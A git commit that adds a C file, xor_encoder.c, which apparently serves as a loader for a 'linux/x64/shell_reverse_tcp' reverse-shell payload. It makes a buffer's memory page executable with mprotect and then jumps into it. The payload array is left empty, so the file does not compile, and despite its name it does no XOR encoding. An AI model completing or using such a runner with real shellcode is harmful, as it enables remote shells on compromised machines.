e50bf51d92f71c11aadbcfb1f6dc29bfa511ece5
Daljin <42755812+Daljin@users.noreply.github.com>
2026-02-14 16:13:45 -0600

    Create xor_encoder.c

---
+++ other/xor_encoder.c
@@ -0,0 +1,25 @@
+#define _GNU_SOURCE
+#include <sys/mman.h> // for mprotect 
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+//'linux/x64/shell_reverse_tcp' payload
+unsigned char buf[] = ;
+
+int main (int argc, char **argv) 
+{
+        intptr_t pagesize = sysconf(_SC_PAGESIZE);
+        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
+                pagesize, PROT_READ|PROT_EXEC))
+        {
+                perror("mprotect");
+                return -1;
+        }
+        	
+	int (*ret)() = (int(*)())buf;
+  	ret();
+  
+        return 0;
+}
